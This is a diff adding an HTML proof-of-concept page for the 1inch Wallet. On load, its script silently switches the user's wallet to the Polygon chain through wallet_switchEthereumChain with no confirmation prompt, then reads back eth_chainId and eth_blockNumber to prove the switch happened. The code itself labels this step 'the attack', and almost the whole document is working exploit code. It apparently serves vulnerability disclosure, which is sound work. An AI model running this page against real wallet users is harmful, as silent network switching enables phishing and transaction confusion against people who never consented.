@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>1inch Wallet - Chain Switch Ground-Truth PoC v3</title>
+<style>
+body { font-family: monospace; margin: 12px; background: #111; color: #0f0; }
+h2 { color: #fff; }
+#log div { padding: 2px 0; border-bottom: 1px solid #222; }
+.ok { color: #0f0; font-weight: bold; }
+.err { color: #f44; font-weight: bold; }
+</style>
+</head>
+<body>
+<h2>1inch Wallet - Chain Switch PoC v3 (provider-level ground truth)</h2>
+<div id="log">loading…</div>
+<script>
+var EL = document.getElementById('log');
+var log = function(s) { var d = document.createElement('div'); d.innerHTML = s; EL.appendChild(d); };
+var OK = function(s) { log('<span class="ok">' + s + '</span>'); };
+var ERR = function(s) { log('<span class="err">' + s + '</span>'); };
+
+function hexDec(hex){ try { return String(BigInt(hex)); } catch(e){ return hex; } }
+
+async function main() {
+    var tries = 0;
+    while (!(window.ethereum && window.ethereum.request)) {
+        if (++tries > 10) { ERR('window.ethereum not available'); return; }
+        await new Promise(r => setTimeout(r, 300));
+    }
+    OK('INFO window.ethereum provider present. No wallet confirmation dialog will be shown.');
+
+    window.ethereum.on && (window.ethereum.on('chainChanged', function(c){
+        log('EVENT chainChanged → ' + c + ' (decimal ' + hexDec(c) + ')');
+    }));
+
+    try {
+        /* Baseline (before): what chain is the wallet on right now? */
+        var base = await window.ethereum.request({method:'eth_chainId'});
+        OK('STEP A baseline eth_chainId = ' + base + ' (decimal ' + hexDec(base) + ')');
+
+        /* The attack: switch chain with NO user confirmation */
+        log('--- STEP B: requesting wallet_switchEthereumChain to 0x89 ---');
+        var res = await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{chainId: '0x89'}]
+        });
+        OK('STEP B wallet_switchEthereumChain RESOLVED (result=' + JSON.stringify(res) + ') — accepted, no rejection, no user prompt');
+
+        /* After: read the chain back from the wallet's own provider */
+        var after = await window.ethereum.request({method:'eth_chainId'});
+        if (after === '0x89') OK('STEP C eth_chainId after = ' + after + ' → WALLET ACTIVE CHAIN IS NOW POLYGON (137). Silent switch TERMINATED.');
+        else ERR('STEP C eth_chainId after = ' + after + ' — chain did NOT change');
+
+        var bn = await window.ethereum.request({method:'eth_blockNumber'});
+        OK('STEP D eth_blockNumber = ' + bn + ' = decimal ' + hexDec(bn) + ' → wallet now answering RPC for the post-switch chain');
+    } catch (e) {
+        ERR('FAILED: ' + (e && e.message) + (e && e.code !== undefined ? ' (code ' + e.code + ')' : ''));
+    }
+}
+window.addEventListener('load', function(){ setTimeout(main, 300); });
+</script>
+</body>
+</html>
